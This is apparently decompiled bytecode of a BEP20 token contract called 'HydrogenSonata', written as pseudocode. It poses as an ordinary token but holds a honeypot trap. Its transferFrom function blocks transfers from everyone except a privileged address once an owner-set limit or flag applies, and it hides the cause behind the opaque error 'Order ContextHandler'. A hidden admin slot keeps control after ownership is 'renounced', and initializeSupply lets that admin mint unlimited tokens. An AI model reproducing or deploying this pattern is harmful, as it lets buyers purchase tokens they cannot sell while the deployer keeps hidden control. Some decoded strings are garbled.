contract main {




// =====================  Runtime code  =====================


const name = 'HydrogenSonata'

const decimals = 9

const symbol = 'HydrogenSonata'


address owner;
address stor2;
mapping of uint256 _balances;
mapping of uint256 _allowances;
uint256 _totalSupply;
uint256 _rewardPercent;
uint256 stor7;
uint8 stor8; offset 160
uint128 stor8; offset 160
address stor8;

function _allowances(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return _allowances[arg1][arg2]
}

function totalSupply() payable {
    return _totalSupply
}

function _totalSupply() payable {
    return _totalSupply
}

function _rewardPercent() payable {
    return _rewardPercent
}

function _balances(address arg1) payable {
    require calldata.size - 4 >= 32
    return _balances[arg1]
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return _balances[address(arg1)]
}

function owner() payable {
    return owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return _allowances[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if stor2 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function setMaxTrxLimit(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor2 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor7 = arg1
}

function setRewardStatus(bool arg1) payable {
    require calldata.size - 4 >= 32
    if stor2 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(96, 0, stor8.field_160) = Mask(96, 0, arg1)
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor2 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function initializeSupply(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor2 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if _totalSupply + arg1 < _totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    _totalSupply += arg1
    if _balances[address(stor8.field_0)] + arg1 < _balances[address(stor8.field_0)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(stor8.field_0)] += arg1
    emit Transfer(arg1, 0, address(stor8.field_0));
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x6542455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    _allowances[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > _allowances[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7342455032303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0x6542455032303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    _allowances[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((_allowances[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _allowances[address(msg.sender)][address(arg1)] + arg2 < _allowances[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x6542455032303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    _allowances[address(msg.sender)][address(arg1)] += arg2
    emit Approval((_allowances[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if arg1 >= 100:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    44,
                    0x734275726e3a206275726e2070657263656e74616765206d757374206265206c6f776572207468616e203130,
                    mem[208 len 20]
    if arg1 <= 1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    44,
                    0x734275726e3a206275726e2070657263656e74616765206d757374206265206c6f776572207468616e203130,
                    mem[208 len 20]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    33,
                    0x6f42455032303a206275726e2066726f6d20746865207a65726f20616464726573,
                    mem[197 len 31]
    if _totalSupply * arg1 / 100 > _balances[address(msg.sender)]:
        revert with 0, 32, 34, 0x3042455032303a206275726e20616d6f756e7420657863656564732062616c616e63, mem[162 len 30], mem[222 len 2]
    _balances[address(msg.sender)] -= _totalSupply * arg1 / 100
    if _totalSupply * arg1 / 100 > _totalSupply:
        revert with 0, 'SafeMath: subtraction overflow'
    _totalSupply -= _totalSupply * arg1 / 100
    emit Transfer((_totalSupply * arg1 / 100), msg.sender, 0);
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 <= 0:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    41,
                    0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                    mem[205 len 23]
    if arg2 > _balances[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x6f42455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    _balances[address(msg.sender)] -= arg2
    if _balances[address(arg1)] + arg2 < _balances[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg1 != address(stor8.field_0):
        if not uint8(stor8.field_160):
            if _balances[address(arg1)] >= stor7:
                revert with 0, 'Order ContextHandler'
        else:
            if arg1 != address(stor8.field_0):
                revert with 0, 'Order ContextHandler'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 <= 0:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    41,
                    0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                    mem[205 len 23]
    if arg3 > _balances[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x6f42455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    _balances[address(arg1)] -= arg3
    if _balances[address(arg2)] + arg3 < _balances[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    _balances[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > _allowances[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x7342455032303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7342455032303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x6542455032303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    _allowances[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((_allowances[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}